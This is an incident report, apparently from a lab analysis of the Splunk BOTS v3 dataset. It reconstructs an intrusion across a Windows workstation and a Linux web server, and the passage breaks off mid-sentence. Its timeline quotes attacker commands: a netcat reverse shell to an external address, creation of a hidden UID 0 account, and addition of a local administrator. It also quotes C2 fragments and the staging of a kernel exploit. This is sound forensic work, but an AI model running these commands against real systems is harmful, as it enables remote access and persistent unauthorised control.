# INC-001: Hands-on-keyboard intrusion across FYODOR-L and hoth

|Field|Value|
|-|-|
|Status|Preliminary (analysis in progress)|
|Dataset|Splunk BOTS v3, `index=botsv3`|
|Event date|2018-08-20 (times are as displayed in Splunk; Linux log lines, osquery `calendarTime` and Sysmon UTC are 4 hours ahead)|
|Hosts involved|FYODOR-L (Windows), hoth / 192.168.9.30 (Linux)|
|External address|45.77.53.176|
|Analysis performed|2026-11-25, Splunk Enterprise lab|

Confidence labels: **Confirmed** = directly seen in log fields. **Likely** = inferred from several consistent log sources. **Open** = not yet verified.

## 1. Summary

A hidden, encoded PowerShell process on FYODOR-L (user `AzureAD\FyodorMalteskesko`) created a local administrator account named `svcvnc` at 06:08. The same PowerShell process was in contact with 45.77.53.176 from 06:01 until at least 07:59. At 06:47 a tool named `iexeplorer.exe` was written to `C:\Windows\Temp\unziped\lsof-master\`. From 07:05 that tool sent 17 command executions to a web application on 192.168.9.30 (`hoth`): reconnaissance, an account-creation command, staging of a kernel privilege-escalation source file, and a netcat reverse shell to 45.77.53.176:8088 (attempted at 07:13:56 and again at 07:34:01).

On hoth, osquery process events show two `useradd` runs creating `tomcat7` as a UID 0 account. The first (about 07:07) ran as the web application's unprivileged service user (uid 111, decoration `tomcat8`) and left no new-user entry in `auth.log`. The second (07:24:44 to 07:24:46) ran as root and is recorded by both `auth.log` and osquery with the same PID (12815). Root rights were therefore obtained between 07:07 and 07:24. How is not shown: the kernel exploit is the candidate, but its compilation or execution is not logged.

## 2. Timeline

|Time|Host|Event|Confidence|
|-|-|-|-|
|05:45:19|FYODOR-L, hoth|HTTP traffic containing `showcase.action` in `stream:http` (17 events on hoth until 07:05:17). Purpose unknown (may be normal application use)|Open|
|05:48:17|splunk.froth.ly, matar|45.77.53.176 appears in O365 message trace (8 events) and `stream:smtp` (4 events). Meaning unknown|Open|
|06:01|ABUNGST-L, FYODOR-L|First DNS and Sysmon records containing 45.77.53.176 (06:01:03 and 06:01:46)|Confirmed|
|06:08:17|FYODOR-L|`net user /add svcvnc [REDACTED]` run by net.exe / net1.exe; parent is `powershell.exe -NoP -NonI -W Hidden -enc ...`|Confirmed|
|06:08:35|FYODOR-L|`net localgroup administrators svcvnc /add`, same PowerShell parent (PID 6360), same logon session|Confirmed|
|06:24:58|hoth|`unix:useraccounts` shows `tomcat7` with UID 0 and `/bin/bash`; `usersWithLoginPrivs` lists root, klagerfield and tomcat7. This snapshot is earlier than the creation recorded by two other sources at 07:24 (see Open questions)|Confirmed as a record; timestamp disputed|
|06:45:03|FYODOR-L|One PowerShell/Operational event mentions 192.168.9.30 (not yet reviewed)|Open|
|06:47:41|FYODOR-L|powershell.exe created `lsof-master\powershell.exe` and `lsof-master\iexeplorer.exe` in `C:\Windows\Temp\unziped\` (Sysmon EventID 11)|Confirmed|
|07:00:04 to 07:01:55|hoth|SSH password logins for user `klagerfield` from 192.168.8.109 and 192.168.8.117, each followed by `sudo /bin/bash` as root. Relation to the intrusion unknown (may be routine administration)|Open|
|07:05:40 to 07:07:46|FYODOR-L to hoth|`iexeplorer.exe` run against `http://192.168.9.30:8080/frothlyinventory/showcase.action` with: `whoami`, `id`, `groups`, `cat /etc/passwd`, `useradd -ou 0 -g 0 ... tomcat7 -p [REDACTED]` (07:07:03), `uname -a`, `lsb_release -a`|Confirmed (commands sent)|
|07:07:17|hoth|osquery `proc_events`: `/usr/sbin/useradd` (PID 5752) run with uid/euid 111, decoration user `tomcat8`. No new-user entry in `auth.log`|Confirmed (process); failure Likely (unprivileged)|
|07:08:36 to 07:11:45|FYODOR-L to hoth|Base64 text written to `/tmp/colonel`, `ls -lf /tmp`, decoded to `/tmp/colonel.c`, then `cat` and `md5sum`. Header comment indicates a public Ubuntu 16.04.4 kernel privilege-escalation exploit|Confirmed (commands); exploit identity partly verified|
|07:09:48|FYODOR-L to hoth|Base64 data with a JPEG header written to an unreviewed destination|Open|
|07:12:51|FYODOR-L to hoth|`mknod /tmp/backpipe p`|Confirmed|
|07:13:56|FYODOR-L to hoth|`/bin/sh 0</tmp/backpipe \| nc 45.77.53.176 8088 1>/tmp/backpipe` (first attempt). Cisco ASA event at 07:13:57; hoth `ps` lists the attacker address from 07:14:24 and `netstat` from 07:14:54|Confirmed|
|07:24:44|hoth|`auth.log`: `useradd[12815]: new user: name=tomcat7, UID=0, GID=0, home=/home/tomcat7, shell=/bin/bash`. osquery records the same PID 12815 at 07:24:46, run as root (euid 0) with a different password string than the first attempt ([REDACTED]). No `iexeplorer.exe` command ran at this time; no sudo or SSH login accompanies it|Confirmed|
|07:33:45|FYODOR-L to hoth|`mknod /tmp/backpipe p` (second run)|Confirmed|
|07:34:01|FYODOR-L to hoth|Same `nc` reverse-shell command (second attempt)|Confirmed|
|07:48:24|hoth|`unix:useraccounts` shows `tomcat7` unchanged (UID 0)|Confirmed|
|up to 07:59|FYODOR-L, hoth|Sysmon and `ps` still contain 45.77.53.176|Confirmed|

## 3. Key findings

**Confirmed**

* `svcvnc` appears in 15 events (11 Security, 4 Sysmon), all between 06:08:17 and 06:08:35. No later activity under that name was found in botsv3.
* FYODOR-L Sysmon shows 3,850 network connections (EventID 3) from `powershell.exe` involving 45.77.53.176, from 06:01:46 to 07:59:36.
* 45.77.53.176 also appears on ABUNGST-L (1,070 Sysmon events, 06:01:04 to 07:59:24), on hoth (`netstat`, `ps`, `osquery:results`, `stream:http`) and in the Cisco ASA logs.
* Decoded fragments of the encoded PowerShell show `https://45.77.53.176:443`, the path `/admin/get.php` and an Internet Explorer 11 user-agent string. Only fragments were decoded, not the whole script.
* `iexeplorer.exe` ran 17 times against 192.168.9.30 (15 distinct commands). `mknod /tmp/backpipe p` and the